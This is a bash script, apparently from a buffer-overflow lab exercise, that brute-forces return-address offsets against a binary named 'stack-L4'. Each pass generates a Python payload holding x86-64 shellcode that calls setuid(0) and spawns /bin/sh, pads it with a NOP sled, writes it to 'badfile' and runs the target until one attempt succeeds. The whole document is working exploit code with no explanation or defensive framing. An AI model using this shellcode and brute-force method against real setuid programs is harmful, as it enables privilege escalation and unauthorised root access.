#!/bin/bash

echo "Trying different offsets for Level 4..."

for off in 180 184 188 192 196 200 204 208 212 216 220 224 228 232 236 240
do
    echo "======================================"
    echo "Trying offset: $off"
    
    cat > exploit-L4.py << EOF
#!/usr/bin/python3
import sys

shellcode = (
    "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

start = 100
content[start:start + len(shellcode)] = shellcode

buffer_addr = 0x7fffffffd946
ret = buffer_addr + $off

offset = 18
L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
EOF
    
    python3 exploit-L4.py
    timeout 2 ./stack-L4
    
    if [ $? -eq 0 ]; then
        echo "SUCCESS at offset $off!"
        break
    fi
    
    sleep 0.1
done
